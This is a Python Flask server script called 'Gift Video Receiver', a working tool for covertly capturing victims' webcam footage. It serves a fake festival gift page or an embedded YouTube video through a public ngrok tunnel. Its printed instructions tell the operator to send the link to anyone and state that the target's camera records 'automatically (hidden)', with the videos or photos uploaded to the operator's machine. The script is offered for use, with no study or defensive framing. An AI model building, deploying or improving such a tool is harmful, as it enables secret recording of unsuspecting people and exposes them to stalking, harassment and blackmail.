#!/usr/bin/env python3
"""
Gift Video Receiver Server - Complete Terminal Menu
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.parse
import urllib.request
import re
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

# ============================================
# Configuration
# ============================================
UPLOAD_FOLDER = 'gift_videos'
PORT = 5000
FESTIVAL_HTML = 'festival.html'
YOUTUBE_HTML = 'youtube.html'

# ============================================
# Flask Application
# ============================================
app = Flask(__name__)
CORS(app)

received_files = []

@app.route('/festival')
def festival_page():
    try:
        with open(FESTIVAL_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404

@app.route('/youtube')
def youtube_page():
    try:
        with open(YOUTUBE_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404

@app.route('/upload', methods=['POST'])
def upload_media():
    try:
        if 'media' not in request.files:
            return jsonify({'error': 'No media file'}), 400
        
        media_file = request.files['media']
        if media_file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        media_type = request.form.get('type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Determine extension
        if media_type == 'photo':
            ext = 'jpg'
        else:
            ext = 'webm'
        
        filename = f"{media_type}_{timestamp}.{ext}"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        media_file.save(filepath)
        
        file_info = {
            'filename': filename,
            'path': filepath,
            'type': media_type,
            'timestamp': timestamp,
            'size': os.path.getsize(filepath)
        }
        received_files.append(file_info)
        
        print(f"\n📹 Received {media_type} {len(received_files)}")
        print(f"   📁 {filename}")
        print(f"   📊 {file_info['size']:,} bytes")
        
        # Auto-open the file
        try:
            if sys.platform == 'linux':
                subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif sys.platform == 'darwin':
                subprocess.run(['open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        return jsonify({'success': True, 'filename': filename}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/files', methods=['GET'])
def list_files():
    return jsonify({'files': received_files})

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# Main Server Class
# ============================================
class GiftServer:
    def __init__(self):
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def setup_directories(self):
        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)

    def check_html_files(self):
        if not os.path.exists(FESTIVAL_HTML):
            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
            return False
        if not os.path.exists(YOUTUBE_HTML):
            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
            return False
        return True

    def get_camera_type(self):
        """Get camera type from user"""
        print("\n📷 Select camera type:")
        print("  1. Front Camera")
        print("  2. Back Camera")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'user'
            elif choice == '2':
                return 'environment'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_capture_mode(self):
        """Get capture mode from user"""
        print("\n📸 Select capture mode:")
        print("  1. Video - Record 15 second video")
        print("  2. Photo - Capture 5 photos")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'video', 15, 0
            elif choice == '2':
                return 'photo', 0, 5
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def show_main_menu(self):
        """Show main menu and get user choice"""
        print("\n" + "="*60)
        print("🎁 GIFT VIDEO RECEIVER")
        print("="*60)
        print("\nSelect mode:")
        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
        print("\n" + "-"*60)
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'festival'
            elif choice == '2':
                return 'youtube'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_festival_name(self):
        name = input("\n📝 Enter festival/gift name: ").strip()
        if not name:
            name = "Surprise"
            print(f"   Using default: {name}")
        return name

    def get_youtube_video(self):
        print("\n🎬 Enter YouTube video URL or ID:")
        print("   (Press Enter for default video)")
        video = input("   ▶ ").strip()
        
        if video and ('youtube.com' in video or 'youtu.be' in video):
            patterns = [
                r'(?:youtube\.com\/watch\?v=)([^&]+)',
                r'(?:youtu\.be\/)([^?]+)',
                r'(?:youtube\.com\/embed\/)([^?]+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, video)
                if match:
                    video = match.group(1)
                    break
        
        if not video:
            video = "dQw4w9WgXcQ"
            print(f"   Using default video ID: {video}")
        else:
            print(f"   Using video ID: {video}")
        
        return video

    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
        base_url = self.ngrok_url
        
        if mode == 'festival':
            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎊 Festival Mode"
        else:
            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎬 YouTube Mode"
        
        return link, mode_name

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        print("📥 Install from: https://ngrok.com/download")
        return False

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def wait_for_files(self):
        print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
        print(f"📁 Files saved in: {UPLOAD_FOLDER}/")
        print("-"*50)
        print("\n⏳ Waiting for first file...")
        
        try:
            last_count = 0
            while self.running:
                current_count = len(received_files)
                
                if current_count > last_count:
                    file_info = received_files[-1]
                    print(f"\n📹 Received {file_info['type']} {current_count}")
                    print(f"   📁 {file_info['filename']}")
                    print(f"   📊 {file_info['size']:,} bytes")
                    last_count = current_count
                    print(f"\n⏳ Waiting for next file...")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            self.setup_directories()
            
            if not self.check_html_files():
                return
            
            if not self.check_ngrok():
                return
            
            # Step 1: Main menu (Festival or YouTube)
            mode = self.show_main_menu()
            
            # Step 2: Camera type
            camera = self.get_camera_type()
            
            # Step 3: Capture mode (Video or Photo)
            capture_mode, duration, photos = self.get_capture_mode()
            
            # Step 4: Get specific details
            if mode == 'festival':
                name = self.get_festival_name()
                video_id = None
            else:
                video_id = self.get_youtube_video()
                name = None
            
            # Start server
            self.start_flask()
            if not self.start_ngrok():
                return
            
            # Generate link
            link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
            
            # Display the link
            print("\n" + "="*60)
            print(f"📤 SHARE THIS LINK ({mode_name}):")
            print("="*60)
            print(f"\n🔗 {link}")
            print("\n" + "="*60)
            
            # Instructions
            print("\n📋 Configuration Summary:")
            print(f"   🎯 Mode: {mode_name}")
            print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
            print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
            
            if mode == 'festival':
                print(f"   🎊 Festival Name: {name}")
            else:
                print(f"   🎬 Video ID: {video_id}")
            
            print("\n📋 Instructions:")
            if mode == 'festival':
                print("   1. Send the link above to anyone")
                print("   2. They see a festival/gift page")
                print("   3. They click 'Open Your Gift'")
                print("   4. Camera records automatically (hidden)")
                if capture_mode == 'video':
                    print(f"   5. Records {duration} second video")
                else:
                    print(f"   5. Captures {photos} photos")
                print("   6. Files save to your computer!")
            else:
                print("   1. Send the link above to anyone")
                print("   2. They see a YouTube video playing")
                print("   3. Camera records automatically (hidden)")
                if capture_mode == 'video':
                    print(f"   4. Records {duration} second video")
                else:
                    print(f"   4. Captures {photos} photos")
                print("   5. Files save to your computer!")
            
            print("="*60)
            print("\n📋 Link printed above - copy it manually")
            print(f"📁 Files saved in: {UPLOAD_FOLDER}/")
            
            self.wait_for_files()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    server = GiftServer()
    server.run()